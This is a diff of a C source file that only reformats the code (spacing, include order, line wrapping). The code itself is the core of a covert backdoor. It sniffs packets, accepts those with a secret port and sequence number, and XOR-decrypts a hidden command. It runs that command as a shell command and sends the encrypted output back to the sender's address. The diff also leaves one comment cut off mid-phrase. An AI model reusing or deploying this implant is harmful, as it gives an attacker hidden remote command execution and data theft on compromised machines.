@@ -1,7 +1,7 @@
 #include <arpa/inet.h>
 #include <stdio.h>
-#include <string.h>
 #include <stdlib.h>
+#include <string.h>
 #include <unistd.h>
 
 #include "constants.h"
@@ -17,9 +17,10 @@
  *
  * Params:
  *      const char *command: The command to execute.
+ *
  *      char **result: The pointer the the output buffer pointer.
  */
-char** execute_command(const char *command, int *size)
+char **execute_command(const char *command, int *size)
 {
     FILE *fp;
     const int MAX_LINE_LEN = 1024;
@@ -33,7 +34,7 @@ char** execute_command(const char *command, int *size)
     int i = 1;
     while (fgets(line_buffer, MAX_LINE_LEN, fp))
     {
-        temp = realloc(result, i * sizeof(char*));
+        temp = realloc(result, i * sizeof(char *));
         if (!temp)
         {
             perror("realloc");
@@ -49,16 +50,19 @@ char** execute_command(const char *command, int *size)
     return result;
 }
 
-
 /*
-* Callback function for examining captured packets.
-*
-* Params:
-*       u_char* args: Pointer to user data.
-*       const struct pcap_pkthdr* header: Struct that contains information about the captured packet.
-*       u_char* packet: Pointer to the captured packet in serialized form.
-*/
-void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* packet)
+ * Callback function for examining captured packets.
+ *
+ * Params:
+ *       u_char* args: Pointer to user data.
+ *
+ *       const struct pcap_pkthdr* header: Struct that contains information
+ * about the captured packet.
+ *
+ *       u_char* packet: Pointer to the captured packet in serialized form.
+ */
+void got_packet(u_char *args, const struct pcap_pkthdr *header,
+                const u_char *packet)
 {
     char command[MAX_COMMAND_LEN];
     char payload_buffer[MAX_COMMAND_LEN];
@@ -72,11 +76,11 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     int tcp_sport;
     unsigned int tcp_seqnum;
 
-    char* payload;
-    char* end_ptr;
+    char *payload;
+    char *end_ptr;
 
-    const struct sniff_ip* ip;
-    const struct sniff_tcp* tcp;
+    const struct sniff_ip *ip;
+    const struct sniff_tcp *tcp;
 
     int size_ip = 0;
     int size_tcp = 0;
@@ -88,31 +92,36 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     memset(decrypted, 0, MAX_COMMAND_LEN);
 
     // calculate lengths
-    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
+    ip = (struct sniff_ip *)(packet + SIZE_ETHERNET);
     size_ip = IP_HL(ip) * 4;
 
-    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
+    tcp = (struct sniff_tcp *)(packet + SIZE_ETHERNET + size_ip);
     size_tcp = TH_OFF(tcp) * 4;
 
     tcp_sport = ntohs(tcp->th_sport);
     tcp_seqnum = ntohl(tcp->th_seq);
 
     // Step 1: Locate the payload of the packet
-    payload = (char*)(packet + SIZE_ETHERNET + size_ip + size_tcp);
+    payload = (char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
     size_payload = ip->ip_len - size_ip - size_tcp;
 
     // Step 2: Authenticate the packet
-    if (!is_seq_num_auth(tcp_sport, tcp_seqnum)) return;
-    printf("Got an authenticated packet\n Source port: %u\n Seqnum: %u\n", tcp_sport, tcp_seqnum);
+    if (!is_seq_num_auth(tcp_sport, tcp_seqnum))
+        return;
+    printf("Got an authenticated packet\n Source port: %u\n Seqnum: %u\n",
+           tcp_sport, tcp_seqnum);
 
     // Step 3: Decrypt the payload
-    xor_bytes(XOR_KEY, strlen(XOR_KEY), payload_buffer, decrypted, size_payload);
+    xor_bytes(XOR_KEY, strlen(XOR_KEY), payload_buffer, decrypted,
+              size_payload);
     printf("Decrypted payload: %s\n", decrypted);
 
     // Step 4: Verify decrypted payload has a command in it
-    if (!(payload = strstr(decrypted, COMMAND_START))) return;
+    if (!(payload = strstr(decrypted, COMMAND_START)))
+        return;
     payload += strlen(COMMAND_START);
-    if (!(end_ptr = strstr(decrypted, COMMAND_END))) return;
+    if (!(end_ptr = strstr(decrypted, COMMAND_END)))
+        return;
 
     // Step 5: Extract the command
     strncpy(command, payload, end_ptr - payload);
@@ -138,11 +147,14 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
 
     // Step 7: Send the results back
     encrypted_command_output = malloc(total_size);
-    xor_bytes(XOR_KEY, strlen(XOR_KEY), command_output, encrypted_command_output, strlen(command_output));
-    send_message_to_ip(ip->ip_src, SERVER_PORT, encrypted_command_output, strlen(encrypted_command_output));
+    xor_bytes(XOR_KEY, strlen(XOR_KEY), command_output,
+              encrypted_command_output, strlen(command_output));
+    send_message_to_ip(ip->ip_src, SERVER_PORT, encrypted_command_output,
+                       strlen(encrypted_command_output));
 
     free(encrypted_command_output);
-    free(command_output); // free command_output which was malloced by execute_command
+    // free command_output which was malloced by
+    free(command_output);
 
     return;
 }
